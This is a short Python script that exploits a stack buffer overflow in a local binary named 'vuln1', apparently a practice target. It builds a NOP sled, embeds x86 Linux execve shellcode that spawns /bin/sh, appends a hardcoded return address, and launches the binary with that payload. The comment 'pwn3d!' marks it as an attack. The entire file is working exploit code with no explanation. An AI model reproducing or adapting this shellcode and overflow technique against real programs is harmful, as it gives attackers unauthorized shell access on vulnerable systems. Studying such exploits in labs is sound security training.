#!/usr/bin/evn python

import struct
import subprocess

retaddr = 0xbffff4f8

shellcode = "\x31\xc0\x50\x31\xdb\xbb\xff\xff\xff\xff\x81\xeb\xd0\xd0\x8c"
shellcode += "\x97\x83\xec\x04\x89\x1c\x24\x31\xdb\xbb\xff\xff\xff\xff\x81"
shellcode += "\xeb\xd0\x9d\x96\x91\x83\xec\x04\x89\x1c\x24\x89\xe3\x50\x89"
shellcode += "\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

buf = ""
buf += "\x90" * 187
buf += shellcode
buf += struct.pack("<I", retaddr) * 24

# pwn3d! ;)
subprocess.call(["./vuln1", buf])

